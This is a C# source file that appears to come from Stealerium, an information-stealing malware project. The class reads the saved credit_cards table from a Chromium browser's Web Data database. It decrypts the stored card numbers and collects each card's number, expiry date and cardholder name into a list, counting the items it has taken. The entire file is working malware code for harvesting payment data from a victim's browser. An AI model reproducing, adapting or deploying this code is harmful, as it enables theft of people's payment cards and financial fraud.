using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class CreditCards
    {
        /// <summary>
        ///     Get CreditCards from chromium based browsers
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with credit cards</returns>
        public static List<CreditCard> Get(string sWebData)
        {
            var lcCc = new List<CreditCard>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sWebData, "credit_cards");
                if (sSqLite == null) return lcCc;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var cCard = new CreditCard
                    {
                        Number = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sSqLite.GetValue(i, 4))),
                        ExpYear = Crypto.GetUtf8(sSqLite.GetValue(i, 3)),
                        ExpMonth = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                        Name = Crypto.GetUtf8(sSqLite.GetValue(i, 1))
                    };

                    Counter.CreditCards++;
                    lcCc.Add(cCard);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect credit cards\n" + ex);
            }

            return lcCc;
        }
    }
}